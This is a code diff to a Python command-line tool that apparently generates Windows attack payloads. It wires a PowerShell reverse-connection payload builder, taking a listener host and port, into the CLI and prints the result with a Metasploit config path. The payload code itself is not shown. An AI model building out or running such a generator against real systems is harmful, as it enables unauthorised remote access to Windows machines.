@@ -2,6 +2,7 @@ import click
 import sys
 
 from utils.validation import ip_validation, port_validation
+from utils.windows_shellcode import format_payload_powershell
 
 
 @click.group()
@@ -22,8 +23,22 @@ def generate(ctx, lhost, lport):
 @click.option('--type', default='powershell', help='Attack type (powershell/clickjacking/ui).')
 @click.pass_context
 def windows(ctx, type):
+    ip = ctx.obj['ip']
+    port = ctx.obj['port']
+
     if type == 'powershell':
-        click.echo('powershell attack')
+        windows_process = format_payload_powershell(ip, port)
+
+        click.secho(
+            """
+The operation was completed.
+
+This is the powershell: {}
+
+This is the main route of your meta_config file for metasploit: {}
+        """.format(windows_process['powershell'], windows_process['meta_config']),
+            bg='blue', fg='white', bold=True
+        )
     elif type == 'clickjacking':
         click.echo('clickjacking attack')
     elif type == 'ui':
